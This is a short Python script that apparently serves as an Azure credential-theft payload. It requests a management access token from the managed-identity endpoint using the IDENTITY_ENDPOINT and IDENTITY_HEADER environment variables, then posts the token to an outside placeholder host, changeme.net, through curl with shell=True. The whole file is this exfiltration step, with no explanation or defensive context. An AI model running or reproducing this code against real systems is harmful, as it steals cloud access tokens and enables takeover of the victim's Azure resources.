import os, subprocess
resp = subprocess.getoutput(f"curl -s \"{os.getenv('IDENTITY_ENDPOINT')}/?resource=https://management.azure.com/&api-version=2019-08-01\" -H \"X-IDENTITY-HEADER: {os.getenv('IDENTITY_HEADER')}\"")
subprocess.call(f"curl -s -X POST -d \"{resp}\" https://changeme.net", shell=True)